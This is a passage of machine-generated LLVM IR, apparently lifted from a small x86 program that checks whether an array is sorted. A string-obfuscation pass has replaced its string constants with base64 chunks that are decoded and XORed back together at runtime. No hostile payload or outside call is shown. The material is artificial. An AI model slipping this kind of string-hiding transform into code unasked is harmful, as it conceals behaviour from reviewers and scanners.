  %cipher.ptr.468 = alloca [5 x i8]
  store [5 x i8] c"\63\30\46\59\00", [5 x i8]* %cipher.ptr.468
  %cipher.468 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.468, i32 0, i32 0
  %plain.ptr.468 = tail call i8* @base64_decode(i8* %cipher.468)
  %spi468 = bitcast i8* %plain.ptr.468 to [3 x i8]*
  %s6.150 = load [3 x i8], [3 x i8]* %spi468
;-------------------------------
  %sp6.150 = bitcast i8* %next5.150 to [3 x i8]*
  store [3 x i8] %s6.150, [3 x i8]* %sp6.150
  %next6.150 = getelementptr [21 x i8], [21 x i8]* %sp150, i32 0, i32 18
  
;-------------------------------
; Replace: %s7.150 = load [3 x i8], [3 x i8]* @str.7.150
  %cipher.ptr.469 = alloca [5 x i8]
  store [5 x i8] c"\59\55\78\52\00", [5 x i8]* %cipher.ptr.469
  %cipher.469 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.469, i32 0, i32 0
  %plain.ptr.469 = tail call i8* @base64_decode(i8* %cipher.469)
  %spi469 = bitcast i8* %plain.ptr.469 to [3 x i8]*
  %s7.150 = load [3 x i8], [3 x i8]* %spi469
;-------------------------------
  %sp7.150 = bitcast i8* %next6.150 to [3 x i8]*
  store [3 x i8] %s7.150, [3 x i8]* %sp7.150

  %spi150 = load [21 x i8], [21 x i8]* %sp150
  store [21 x i8] %spi150, [21 x i8]* %sp1.37
;-------------------------------
  %sp1.1.37 = bitcast [21 x i8]* %sp1.37 to i168*
  %i1.37 = load i168, i168* %sp1.1.37

  %xp37 = xor i168 %i0.37, %i1.37

  %fi.37 = alloca i168
  store i168 %xp37, i168* %fi.37

  %spi37 = bitcast i168* %fi.37 to [21 x i8]*
  %spi.bis.699 = ptrtoint[21 x i8]* %spi37 to i32
;-------------------------------
  %.39 = select i1 %switch6, i32 %spi.bis.698, i32 %spi.bis.699
  %.40 = select i1 %switch6, i32 134517276, i32 134517323
  store i32 %r_ebp.134, i32* %41, align 8
  store i32 %r_ebx.133, i32* %40, align 4
  store i32 %., i32* %20, align 4
  store i32 %.39, i32* %42, align 16
  store i32 %.40, i32* %43, align 4
  %35 = tail call x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %tmp2_v4.i72.i, i32 inreg noundef %.39, i32 noundef %tmp2_v2.i9.i.i, i32 noundef ptrtoint (i32 (i8*, ...)* @printf to i32))  nobuiltin nounwind "no-builtins" 
  %.pn26 = load i32, i32* %40, align 4
  %.pn27 = load i32, i32* %41, align 8
  %tmp2_v.i18.i = add i32 %.pn27, -260
  %36 = inttoptr i32 %tmp2_v.i18.i to i32*
  %37 = load i32, i32* %36, align 4
  %tmp0_v1.i20.i = add i32 %37, 1
  store i32 %tmp0_v1.i20.i, i32* %36, align 4
  %38 = icmp slt i32 %tmp0_v1.i20.i, 2
  br i1 %38, label %BB_80492EC.i, label %.exit

BB_80492EC.i.lr.ph:                               ; preds = %Func_80492DE.exit.i
  %tmp2_v.i87.i = add i32 %tmp0_v.i43.i, -268
  %39 = inttoptr i32 %tmp2_v.i87.i to i32*
  store i32 0, i32* %39, align 4
  %tmp2_v7.i.i = add i32 %tmp0_v.i43.i, -284
  %40 = inttoptr i32 %tmp2_v7.i.i to i32*
  %tmp2_v.i.i.i = add i32 %tmp0_v.i43.i, -280
  %41 = inttoptr i32 %tmp2_v.i.i.i to i32*
  %tmp2_v2.i9.i.i = add i32 %tmp0_v.i43.i, -304
  %42 = inttoptr i32 %tmp2_v2.i9.i.i to i32*
  %tmp2_v3.i.i.i = add i32 %tmp0_v.i43.i, -308
  %43 = inttoptr i32 %tmp2_v3.i.i.i to i32*
  br label %BB_80492EC.i

.exit:                                            ; preds = %BB_80492EC.i
  ret void
}
define internal fastcc void @check_if_array_sorted79(i32 %arg_esp) unnamed_addr  norecurse  !retregs !197 {
Func_804929C.exit.i:
  %tmp2_v.i115.i = add i32 %arg_esp, 4
  %tmp0_v.i116.i = and i32 %arg_esp, -16
  %0 = inttoptr i32 %arg_esp to i32*
  %1 = load i32, i32* %0, align 4
  %tmp2_v3.i117.i = add i32 %tmp0_v.i116.i, -4
  %2 = inttoptr i32 %tmp2_v3.i117.i to i32*
  store i32 %1, i32* %2, align 4
  %tmp2_v4.i118.i = add i32 %tmp0_v.i116.i, -8
  %3 = inttoptr i32 %tmp2_v4.i118.i to i32*
  store i32 0, i32* %3, align 8
  %tmp2_v5.i120.i = add i32 %tmp0_v.i116.i, -12
  %4 = inttoptr i32 %tmp2_v5.i120.i to i32*
  store i32 0, i32* %4, align 4
  %tmp2_v6.i122.i = add i32 %tmp0_v.i116.i, -16
  %5 = inttoptr i32 %tmp2_v6.i122.i to i32*
  store i32 %tmp2_v.i115.i, i32* %5, align 16
  %tmp2_v8.i123.i = add i32 %tmp0_v.i116.i, -116
  %6 = inttoptr i32 %tmp2_v8.i123.i to i32*
  store i32 134517233, i32* %6, align 4
  %tmp4_v.i75.i.b = load i1, i1* @segs.0, align 1
  %7 = inttoptr i32 %arg_esp to i32*
  %8 = load i32, i32* %7, align 4
  %tmp2_v2.i79.i = add i32 %tmp0_v.i116.i, -20
  %9 = inttoptr i32 %tmp2_v2.i79.i to i32*
  store i32 %8, i32* %9, align 4
  %tmp2_v3.i80.i = add i32 %tmp0_v.i116.i, -100
  %10 = inttoptr i32 %tmp2_v3.i80.i to i32*
  store i32 1, i32* %10, align 4
  %tmp2_v4.i81.i = add i32 %tmp0_v.i116.i, -96
  %11 = inttoptr i32 %tmp2_v4.i81.i to i32*
  store i32 2, i32* %11, align 16
  %tmp2_v5.i.i = add i32 %tmp0_v.i116.i, -92
  %12 = inttoptr i32 %tmp2_v5.i.i to i32*
  store i32 3, i32* %12, align 4
  %tmp2_v6.i.i = add i32 %tmp0_v.i116.i, -88
  %13 = inttoptr i32 %tmp2_v6.i.i to i32*
  store i32 4, i32* %13, align 8
  %tmp2_v7.i.i = add i32 %tmp0_v.i116.i, -84
  %14 = inttoptr i32 %tmp2_v7.i.i to i32*
  store i32 5, i32* %14, align 4
  %tmp2_v8.i.i = add i32 %tmp0_v.i116.i, -80
  %15 = inttoptr i32 %tmp2_v8.i.i to i32*
  store i32 6, i32* %15, align 16
  %tmp2_v9.i.i = add i32 %tmp0_v.i116.i, -76
  %16 = inttoptr i32 %tmp2_v9.i.i to i32*
  store i32 7, i32* %16, align 4
  %tmp2_v10.i.i = add i32 %tmp0_v.i116.i, -72
  %17 = inttoptr i32 %tmp2_v10.i.i to i32*
  store i32 8, i32* %17, align 8
  %tmp2_v11.i.i = add i32 %tmp0_v.i116.i, -68
  %18 = inttoptr i32 %tmp2_v11.i.i to i32*
  store i32 9, i32* %18, align 4
  %tmp2_v12.i.i = add i32 %tmp0_v.i116.i, -64
  %19 = inttoptr i32 %tmp2_v12.i.i to i32*
  store i32 10, i32* %19, align 16
  %tmp2_v13.i.i = add i32 %tmp0_v.i116.i, -60
  %20 = inttoptr i32 %tmp2_v13.i.i to i32*
  store i32 10, i32* %20, align 4
  %tmp2_v14.i.i = add i32 %tmp0_v.i116.i, -56
  %21 = inttoptr i32 %tmp2_v14.i.i to i32*
  store i32 9, i32* %21, align 8
  %tmp2_v15.i.i = add i32 %tmp0_v.i116.i, -52
  %22 = inttoptr i32 %tmp2_v15.i.i to i32*
  store i32 8, i32* %22, align 4
  %tmp2_v16.i.i = add i32 %tmp0_v.i116.i, -48
  %23 = inttoptr i32 %tmp2_v16.i.i to i32*
  store i32 7, i32* %23, align 16
  %tmp2_v17.i.i = add i32 %tmp0_v.i116.i, -44
  %24 = inttoptr i32 %tmp2_v17.i.i to i32*
  store i32 6, i32* %24, align 4
  %tmp2_v18.i.i = add i32 %tmp0_v.i116.i, -40
  %25 = inttoptr i32 %tmp2_v18.i.i to i32*
  store i32 5, i32* %25, align 8
  %tmp2_v19.i.i = add i32 %tmp0_v.i116.i, -36
  %26 = inttoptr i32 %tmp2_v19.i.i to i32*
  store i32 4, i32* %26, align 4
  %tmp2_v20.i.i = add i32 %tmp0_v.i116.i, -32
  %27 = inttoptr i32 %tmp2_v20.i.i to i32*
  store i32 3, i32* %27, align 16
  %tmp2_v21.i.i = add i32 %tmp0_v.i116.i, -28
  %28 = inttoptr i32 %tmp2_v21.i.i to i32*
  store i32 2, i32* %28, align 4
  %tmp2_v22.i.i = add i32 %tmp0_v.i116.i, -24
  %29 = inttoptr i32 %tmp2_v22.i.i to i32*
  store i32 1, i32* %29, align 8
  %tmp2_v24.i.i = add i32 %tmp0_v.i116.i, -124
  %30 = inttoptr i32 %tmp2_v24.i.i to i32*
  store i32 10, i32* %30, align 4
  %tmp2_v26.i.i = add i32 %tmp0_v.i116.i, -128
  %31 = inttoptr i32 %tmp2_v26.i.i to i32*
  store i32 %tmp2_v3.i80.i, i32* %31, align 16
  %tmp2_v27.i.i = add i32 %tmp0_v.i116.i, -132
  %32 = inttoptr i32 %tmp2_v27.i.i to i32*
  store i32 134517404, i32* %32, align 4
  %tmp2_v.i.i.i = add i32 %tmp0_v.i116.i, -136
  %33 = inttoptr i32 %tmp2_v.i.i.i to i32*
  store i32 %tmp2_v4.i118.i, i32* %33, align 8
  %tmp2_v1.i.i.i = add i32 %tmp0_v.i116.i, -156
  %34 = inttoptr i32 %tmp2_v1.i.i.i to i32*
  store i32 134517817, i32* %34, align 4
  %tmp2_v.i17.i.i = add i32 %tmp0_v.i116.i, -140
  %35 = inttoptr i32 %tmp2_v.i17.i.i to i32*
  store i32 1, i32* %35, align 4
  %36 = load i32, i32* %30, align 4
  %37 = icmp sgt i32 %36, 1
  br i1 %37, label %BB_804945A.i.i, label %Func_sorted_ascending.exit

BB_804945A.i.i:                                   ; preds = %BB_8049490.i.i, %Func_804929C.exit.i
  %storemerge14.i = phi i32 [ %tmp0_v1.i7.i.i, %BB_8049490.i.i ], [ 1, %Func_804929C.exit.i ]
  %tmp0_v1.i.i.i = shl i32 %storemerge14.i, 2
  %38 = load i32, i32* %31, align 16
  %tmp4_v.i.i.i8 = add i32 %38, %tmp0_v1.i.i.i
  %tmp0_v4.i.i.i = add i32 %tmp4_v.i.i.i8, -4
  %39 = inttoptr i32 %tmp0_v4.i.i.i to i32*
  %40 = load i32, i32* %39, align 4
  %41 = inttoptr i32 %tmp4_v.i.i.i8 to i32*
  %42 = load i32, i32* %41, align 4
  %.not.i.i.i = icmp sgt i32 %40, %42
  %tmp0_v1.i7.i.i = add nuw nsw i32 %storemerge14.i, 1
  br i1 %.not.i.i.i, label %Func_sorted_ascending.exit, label %BB_8049490.i.i

BB_8049490.i.i:                                   ; preds = %BB_804945A.i.i
  store i32 %tmp0_v1.i7.i.i, i32* %35, align 4
  %43 = load i32, i32* %30, align 4
  %44 = icmp slt i32 %tmp0_v1.i7.i.i, %43
  br i1 %44, label %BB_804945A.i.i, label %Func_sorted_ascending.exit

Func_sorted_ascending.exit:                       ; preds = %BB_8049490.i.i, %BB_804945A.i.i, %Func_804929C.exit.i
  %45 = load i32, i32* %33, align 8
;-------------------------------
; Replace: %spi.bis.77 = ptrtoint[20 x i8]* @str.bis.77 to i32
  %sp0.45 = alloca [20 x i8]
;-------------------------------
; Replace: store [20 x i8] c"\51\0A\14\19\3C\03\11\06\0B\46\54\24\51\1C\05\55\2F\0B\24\43", [20 x i8]* %sp0.45
  %sp151 = alloca [20 x i8]
  
;-------------------------------
; Replace: %s0.151 = load [2 x i8], [2 x i8]* @str.0.151
  %cipher.ptr.474 = alloca [5 x i8]
  store [5 x i8] c"\55\51\6f\3d\00", [5 x i8]* %cipher.ptr.474
  %cipher.474 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.474, i32 0, i32 0
  %plain.ptr.474 = tail call i8* @base64_decode(i8* %cipher.474)
  %spi474 = bitcast i8* %plain.ptr.474 to [2 x i8]*
  %s0.151 = load [2 x i8], [2 x i8]* %spi474
;-------------------------------
  %sp0.151 = bitcast [20 x i8]* %sp151 to [2 x i8]*
  store [2 x i8] %s0.151, [2 x i8]* %sp0.151
  %next0.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.151 = load [3 x i8], [3 x i8]* @str.1.151
  %cipher.ptr.480 = alloca [5 x i8]
  store [5 x i8] c"\46\42\6b\38\00", [5 x i8]* %cipher.ptr.480
  %cipher.480 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.480, i32 0, i32 0
  %plain.ptr.480 = tail call i8* @base64_decode(i8* %cipher.480)
  %spi480 = bitcast i8* %plain.ptr.480 to [3 x i8]*
  %s1.151 = load [3 x i8], [3 x i8]* %spi480
;-------------------------------
  %sp1.151 = bitcast i8* %next0.151 to [3 x i8]*
  store [3 x i8] %s1.151, [3 x i8]* %sp1.151
  %next1.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 5
  
;-------------------------------
; Replace: %s2.151 = load [2 x i8], [2 x i8]* @str.2.151
  %cipher.ptr.475 = alloca [5 x i8]
  store [5 x i8] c"\41\78\45\3d\00", [5 x i8]* %cipher.ptr.475
  %cipher.475 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.475, i32 0, i32 0
  %plain.ptr.475 = tail call i8* @base64_decode(i8* %cipher.475)
  %spi475 = bitcast i8* %plain.ptr.475 to [2 x i8]*
  %s2.151 = load [2 x i8], [2 x i8]* %spi475
;-------------------------------
  %sp2.151 = bitcast i8* %next1.151 to [2 x i8]*
  store [2 x i8] %s2.151, [2 x i8]* %sp2.151
  %next2.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 7
  
;-------------------------------
; Replace: %s3.151 = load [3 x i8], [3 x i8]* @str.3.151
  %cipher.ptr.481 = alloca [5 x i8]
  store [5 x i8] c"\42\67\74\47\00", [5 x i8]* %cipher.ptr.481
  %cipher.481 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.481, i32 0, i32 0
  %plain.ptr.481 = tail call i8* @base64_decode(i8* %cipher.481)
  %spi481 = bitcast i8* %plain.ptr.481 to [3 x i8]*
  %s3.151 = load [3 x i8], [3 x i8]* %spi481
;-------------------------------
  %sp3.151 = bitcast i8* %next2.151 to [3 x i8]*
  store [3 x i8] %s3.151, [3 x i8]* %sp3.151
  %next3.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 10
  
;-------------------------------
; Replace: %s4.151 = load [2 x i8], [2 x i8]* @str.4.151
  %cipher.ptr.476 = alloca [5 x i8]
  store [5 x i8] c"\56\43\51\3d\00", [5 x i8]* %cipher.ptr.476
  %cipher.476 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.476, i32 0, i32 0
  %plain.ptr.476 = tail call i8* @base64_decode(i8* %cipher.476)
  %spi476 = bitcast i8* %plain.ptr.476 to [2 x i8]*
  %s4.151 = load [2 x i8], [2 x i8]* %spi476
;-------------------------------
  %sp4.151 = bitcast i8* %next3.151 to [2 x i8]*
  store [2 x i8] %s4.151, [2 x i8]* %sp4.151
  %next4.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 12
  
;-------------------------------
; Replace: %s5.151 = load [3 x i8], [3 x i8]* @str.5.151
  %cipher.ptr.477 = alloca [5 x i8]
  store [5 x i8] c"\55\52\77\46\00", [5 x i8]* %cipher.ptr.477
  %cipher.477 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.477, i32 0, i32 0
  %plain.ptr.477 = tail call i8* @base64_decode(i8* %cipher.477)
  %spi477 = bitcast i8* %plain.ptr.477 to [3 x i8]*
  %s5.151 = load [3 x i8], [3 x i8]* %spi477
;-------------------------------
  %sp5.151 = bitcast i8* %next4.151 to [3 x i8]*
  store [3 x i8] %s5.151, [3 x i8]* %sp5.151
  %next5.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 15
  
;-------------------------------
; Replace: %s6.151 = load [2 x i8], [2 x i8]* @str.6.151
  %cipher.ptr.479 = alloca [5 x i8]
  store [5 x i8] c"\56\53\38\3d\00", [5 x i8]* %cipher.ptr.479
  %cipher.479 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.479, i32 0, i32 0
  %plain.ptr.479 = tail call i8* @base64_decode(i8* %cipher.479)
  %spi479 = bitcast i8* %plain.ptr.479 to [2 x i8]*
  %s6.151 = load [2 x i8], [2 x i8]* %spi479
;-------------------------------
  %sp6.151 = bitcast i8* %next5.151 to [2 x i8]*
  store [2 x i8] %s6.151, [2 x i8]* %sp6.151
  %next6.151 = getelementptr [20 x i8], [20 x i8]* %sp151, i32 0, i32 17
  
;-------------------------------
; Replace: %s7.151 = load [3 x i8], [3 x i8]* @str.7.151
  %cipher.ptr.478 = alloca [5 x i8]
  store [5 x i8] c"\43\79\52\44\00", [5 x i8]* %cipher.ptr.478
  %cipher.478 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.478, i32 0, i32 0
  %plain.ptr.478 = tail call i8* @base64_decode(i8* %cipher.478)
  %spi478 = bitcast i8* %plain.ptr.478 to [3 x i8]*
  %s7.151 = load [3 x i8], [3 x i8]* %spi478
;-------------------------------
  %sp7.151 = bitcast i8* %next6.151 to [3 x i8]*
  store [3 x i8] %s7.151, [3 x i8]* %sp7.151

  %spi151 = load [20 x i8], [20 x i8]* %sp151
  store [20 x i8] %spi151, [20 x i8]* %sp0.45
;-------------------------------
  %sp0.1.45 = bitcast [20 x i8]* %sp0.45 to i160*
  %i0.45 = load i160, i160* %sp0.1.45

  %sp1.45 = alloca [20 x i8]
;-------------------------------
; Replace: store [20 x i8] c"\30\78\66\78\45\32\31\6f\78\66\35\57\32\79\6b\31\46\65\43\43", [20 x i8]* %sp1.45
  %sp152 = alloca [20 x i8]
  
;-------------------------------
; Replace: %s0.152 = load [2 x i8], [2 x i8]* @str.0.152
  %cipher.ptr.489 = alloca [5 x i8]
  store [5 x i8] c"\4d\48\67\3d\00", [5 x i8]* %cipher.ptr.489
  %cipher.489 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.489, i32 0, i32 0
  %plain.ptr.489 = tail call i8* @base64_decode(i8* %cipher.489)
  %spi489 = bitcast i8* %plain.ptr.489 to [2 x i8]*
  %s0.152 = load [2 x i8], [2 x i8]* %spi489
;-------------------------------
  %sp0.152 = bitcast [20 x i8]* %sp152 to [2 x i8]*
  store [2 x i8] %s0.152, [2 x i8]* %sp0.152
  %next0.152 = getelementptr [20 x i8], [20 x i8]* %sp152, i32 0, i32 2
  
;-------------------------------
; Replace: %s1.152 = load [3 x i8], [3 x i8]* @str.1.152
  %cipher.ptr.482 = alloca [5 x i8]
  store [5 x i8] c"\5a\6e\68\46\00", [5 x i8]* %cipher.ptr.482
  %cipher.482 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.482, i32 0, i32 0
  %plain.ptr.482 = tail call i8* @base64_decode(i8* %cipher.482)
  %spi482 = bitcast i8* %plain.ptr.482 to [3 x i8]*
  %s1.152 = load [3 x i8], [3 x i8]* %spi482
;-------------------------------
  %sp1.152 = bitcast i8* %next0.152 to [3 x i8]*
  store [3 x i8] %s1.152, [3 x i8]* %sp1.152
  %next1.152 = getelementptr [20 x i8], [20 x i8]* %sp152, i32 0, i32 5
  
;-------------------------------
; Replace: %s2.152 = load [2 x i8], [2 x i8]* @str.2.152
  %cipher.ptr.483 = alloca [5 x i8]
  store [5 x i8] c"\4d\6a\45\3d\00", [5 x i8]* %cipher.ptr.483
  %cipher.483 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.483, i32 0, i32 0
  %plain.ptr.483 = tail call i8* @base64_decode(i8* %cipher.483)
  %spi483 = bitcast i8* %plain.ptr.483 to [2 x i8]*
  %s2.152 = load [2 x i8], [2 x i8]* %spi483
;-------------------------------
  %sp2.152 = bitcast i8* %next1.152 to [2 x i8]*
  store [2 x i8] %s2.152, [2 x i8]* %sp2.152
  %next2.152 = getelementptr [20 x i8], [20 x i8]* %sp152, i32 0, i32 7
  
;-------------------------------
; Replace: %s3.152 = load [3 x i8], [3 x i8]* @str.3.152
  %cipher.ptr.484 = alloca [5 x i8]
  store [5 x i8] c"\62\33\68\6d\00", [5 x i8]* %cipher.ptr.484
  %cipher.484 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.484, i32 0, i32 0
  %plain.ptr.484 = tail call i8* @base64_decode(i8* %cipher.484)
  %spi484 = bitcast i8* %plain.ptr.484 to [3 x i8]*
  %s3.152 = load [3 x i8], [3 x i8]* %spi484
;-------------------------------
  %sp3.152 = bitcast i8* %next2.152 to [3 x i8]*
  store [3 x i8] %s3.152, [3 x i8]* %sp3.152
  %next3.152 = getelementptr [20 x i8], [20 x i8]* %sp152, i32 0, i32 10
  
;-------------------------------
; Replace: %s4.152 = load [2 x i8], [2 x i8]* @str.4.152
  %cipher.ptr.485 = alloca [5 x i8]
  store [5 x i8] c"\4e\56\63\3d\00", [5 x i8]* %cipher.ptr.485
  %cipher.485 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.485, i32 0, i32 0
  %plain.ptr.485 = tail call i8* @base64_decode(i8* %cipher.485)
  %spi485 = bitcast i8* %plain.ptr.485 to [2 x i8]*
  %s4.152 = load [2 x i8], [2 x i8]* %spi485
;-------------------------------
  %sp4.152 = bitcast i8* %next3.152 to [2 x i8]*
  store [2 x i8] %s4.152, [2 x i8]* %sp4.152
  %next4.152 = getelementptr [20 x i8], [20 x i8]* %sp152, i32 0, i32 12
  
;-------------------------------
; Replace: %s5.152 = load [3 x i8], [3 x i8]* @str.5.152
  %cipher.ptr.488 = alloca [5 x i8]
  store [5 x i8] c"\4d\6e\6c\72\00", [5 x i8]* %cipher.ptr.488
  %cipher.488 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.488, i32 0, i32 0
  %plain.ptr.488 = tail call i8* @base64_decode(i8* %cipher.488)
  %spi488 = bitcast i8* %plain.ptr.488 to [3 x i8]*
  %s5.152 = load [3 x i8], [3 x i8]* %spi488
;-------------------------------
  %sp5.152 = bitcast i8* %next4.152 to [3 x i8]*
  store [3 x i8] %s5.152, [3 x i8]* %sp5.152
  %next5.152 = getelementptr [20 x i8], [20 x i8]* %sp152, i32 0, i32 15
  
;-------------------------------
; Replace: %s6.152 = load [2 x i8], [2 x i8]* @str.6.152
  %cipher.ptr.487 = alloca [5 x i8]
  store [5 x i8] c"\4d\55\59\3d\00", [5 x i8]* %cipher.ptr.487
  %cipher.487 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.487, i32 0, i32 0
  %plain.ptr.487 = tail call i8* @base64_decode(i8* %cipher.487)
